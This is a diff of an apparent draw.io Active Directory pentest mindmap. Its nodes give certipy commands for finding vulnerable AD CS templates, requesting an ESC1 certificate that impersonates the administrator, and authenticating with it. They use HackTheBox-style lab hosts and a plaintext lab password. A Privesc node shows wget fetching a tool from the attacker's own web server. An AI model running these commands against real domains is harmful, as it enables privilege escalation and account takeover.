@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-03-24T11:38:54.008Z" agent="5.0 (X11; Ubuntu)" etag="MqjP0UkaST1y9VomIXzW" version="21.0.8" type="github" pages="5">
+<mxfile host="app.diagrams.net" modified="2023-03-24T15:24:34.957Z" agent="5.0 (X11; Ubuntu)" etag="9g_4P5kgha3jDED9hsAO" version="21.0.8" type="github" pages="5">
   <diagram id="OxgtQte6AoLRu1fJhFKF" name="Reconnaissance">
     <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -80,7 +80,7 @@
     </mxGraphModel>
   </diagram>
   <diagram id="9fB0GFrZQWABB-8gzhsE" name="From no creds">
-    <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="4114" dy="1357" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -272,6 +272,15 @@
         <mxCell id="tifHhTxGpsnXKPDGpU3I-4" value="&lt;div&gt;Ask for a TGT with the certificate&lt;/div&gt;&lt;div&gt;&lt;code&gt;&lt;pre&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py&lt;/font&gt;&lt;/pre&gt;&lt;/code&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
           <mxGeometry x="1050" y="812" width="140" height="65" as="geometry" />
         </mxCell>
+        <mxCell id="rsNCh-QV2zhBNKZOqKP8-1" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-3">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="rsNCh-QV2zhBNKZOqKP8-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-4">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="rsNCh-QV2zhBNKZOqKP8-3" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-5">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <object label="&lt;div&gt;Check if ADCS vulnerable&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy.py&lt;/font&gt;" Commande="certipy find -u user@domain.local -p pass -dc-ip [ip] -vulnerable" id="oLJrZAVxD-DevF4psgEO-1">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
             <mxGeometry x="210" y="950" width="180" height="60" as="geometry" />
@@ -283,7 +292,7 @@
         <mxCell id="oLJrZAVxD-DevF4psgEO-7" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="oLJrZAVxD-DevF4psgEO-4" target="oLJrZAVxD-DevF4psgEO-6">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="&lt;p id=&quot;adcs---esc1&quot;&gt;&lt;b&gt;ESC1: &lt;/b&gt;Impersonate user&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;" Commande="certipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local" id="oLJrZAVxD-DevF4psgEO-4">
+        <object label="&lt;p id=&quot;adcs---esc1&quot;&gt;&lt;b&gt;ESC1: &lt;/b&gt;Impersonate user&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;" Commande="certipy req -u Ryan.Cooper@sequel.htb -p &#39;NuclearMosquito3&#39; -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb" id="oLJrZAVxD-DevF4psgEO-4">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
             <mxGeometry x="480" y="1040" width="120" height="60" as="geometry" />
           </mxCell>
@@ -299,14 +308,14 @@
         </mxCell>
         <object label="&lt;div&gt;Ask for a TGT with the certificate&lt;/div&gt;&lt;div&gt;&lt;code&gt;&lt;pre&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy.py&lt;/font&gt;&lt;/pre&gt;&lt;/code&gt;&lt;/div&gt;" Commande="certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12" Alternative="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="oLJrZAVxD-DevF4psgEO-8">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-            <mxGeometry x="950" y="1033.75" width="160" height="72.5" as="geometry" />
+            <mxGeometry x="900" y="1033.75" width="160" height="72.5" as="geometry" />
           </mxCell>
         </object>
       </root>
     </mxGraphModel>
   </diagram>
   <diagram name="from creds" id="U4GICPjlUHhETOjYcaq2">
-    <mxGraphModel dx="3079" dy="1038" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="3561" dy="1260" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -554,11 +563,11 @@
     </mxGraphModel>
   </diagram>
   <diagram id="25-pziB65gClKSstn0mv" name="Privesc">
-    <mxGraphModel dx="1595" dy="735" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="1914" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
-        <mxCell id="DWQdkfkLdjcR5d87HmEI-1" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="eydW96J8nSPCopO3k54l-1" target="eydW96J8nSPCopO3k54l-5">
+        <mxCell id="DWQdkfkLdjcR5d87HmEI-1" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="eydW96J8nSPCopO3k54l-1" target="eydW96J8nSPCopO3k54l-5" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-1" value="standard user" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#60a917;fontColor=#ffffff;strokeColor=#2D7600;" parent="1" vertex="1">
@@ -585,10 +594,10 @@
         <mxCell id="eydW96J8nSPCopO3k54l-5" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote:wget http://my-ip:8000/&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="220" y="195" width="230" height="110" as="geometry" />
         </mxCell>
-        <mxCell id="1EinaSV8kBPLbE3rXXxN-1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-1">
+        <mxCell id="1EinaSV8kBPLbE3rXXxN-1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="1EinaSV8kBPLbE3rXXxN-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-3">
+        <mxCell id="1EinaSV8kBPLbE3rXXxN-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="qmehafYx0e8W1bQMVf-2-1" value="&lt;div&gt;SEImpersonate Privilege OR &lt;br&gt;&lt;div&gt;&lt;code&gt;SeAssignPrimaryToken&lt;/code&gt;&lt;/div&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
